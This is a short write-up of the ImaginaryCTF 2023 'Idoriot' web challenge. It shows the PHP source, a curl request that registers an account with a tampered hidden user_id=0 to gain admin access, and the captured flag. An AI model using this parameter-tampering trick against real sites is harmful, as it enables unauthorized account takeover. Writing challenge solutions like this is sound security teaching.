---
title: ImaginaryCTF 2023 - Idoriot
description: Writeup for Idoriot web challenge
date: 2023-12-18
tldr: Some idiot made this web site that you can log in to. The idiot even made it in php. I dunno.
draft: false
tags: ["ctf", "writeup", "web"]
---

# Idoriot 

Some idiot made this web site that you can log in to. The idiot even made it in php. I dunno.


```
Welcome, User ID: 4685491
Source Code
<?php

session_start();

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

// Check if session is expired
if (time() > $_SESSION['expires']) {
    header("Location: logout.php");
    exit();
}

// Display user ID on landing page
echo "Welcome, User ID: " . urlencode($_SESSION['user_id']);

// Get the user for admin
$db = new PDO('sqlite:memory:');
$admin = $db->query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')->fetch();

// Check if the user is admin
if ($admin['user_id'] === $_SESSION['user_id']) {
    // Read the flag from flag.txt
    $flag = file_get_contents('flag.txt');
    echo "<h1>Flag</h1>";
    echo "<p>$flag</p>";
} else {
    // Display the source code for this file
    echo "<h1>Source Code</h1>";
    highlight_file(__FILE__);
}

?>
```

Inspecting the `registration.php` we see that `user_id` is pregenerated frontend side? wtf we just want to be `user_id=0` and we are good to go so 

```
curl -X POST -d 'username=hovno&password=hovno&user_id=0' http://idoriot.chal.imaginaryctf.org/register.php
```

login with `hovno:hovno` and get the flag

```
Welcome, User ID: 0
Flag
ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}
```